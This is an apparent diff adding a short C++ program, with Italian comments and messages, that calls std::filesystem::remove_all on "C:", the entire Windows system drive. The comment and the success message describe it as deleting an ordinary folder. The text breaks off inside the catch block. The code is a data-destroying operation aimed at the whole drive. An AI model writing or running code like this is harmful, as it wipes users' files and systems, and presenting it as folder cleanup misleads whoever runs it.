@@ -1,0 +1,15 @@
+#include <iostream>
+#include <filesystem>
+
+namespace fs = std::filesystem;
+
+int main() {
+    std::string folderName = "C:"; 
+    try {
+        // elimina la cartella e tutti i suoi file e sottocartelle
+        fs::remove_all(folderName);
+        std::cout << "La cartella " << folderName << " è stata eliminata con successo!" << std::endl;
+    }
+    catch(const std::exception& e) {
+        std::cerr << "Errore durante l'eliminazione della cartella: " << e.what() << std::endl;
+   
